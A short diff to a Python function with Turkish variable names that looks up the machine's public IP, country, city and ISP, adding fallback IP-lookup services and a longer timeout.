@@ -127,17 +127,23 @@ def run(cards_file: Optional[str] = None) -> None:
         ip = "Alinamadi"
         ulke = sehir = isp = ""
         try:
-            r = _requests.get("https://ipapi.co/json/", timeout=6)
+            r = _requests.get("https://ipapi.co/json/", timeout=8)
             d = r.json()
             ip   = d.get("ip", "")
             ulke = d.get("country_name", "")
             sehir= d.get("city", "")
             isp  = d.get("org", "")
         except Exception:
-            try:
-                ip = _requests.get("https://api.ipify.org", timeout=5).text.strip()
-            except Exception:
-                pass
+            pass
+
+        if not ip or ip == "Alinamadi":
+            for url in ["https://api.ipify.org", "https://checkip.amazonaws.com", "https://icanhazip.com"]:
+                try:
+                    ip = _requests.get(url, timeout=8).text.strip()
+                    if ip:
+                        break
+                except Exception:
+                    continue
 
         add("IP",          ip)
         add("Konum",       (sehir + ", " + ulke).strip(", ") or "Bilinmiyor")
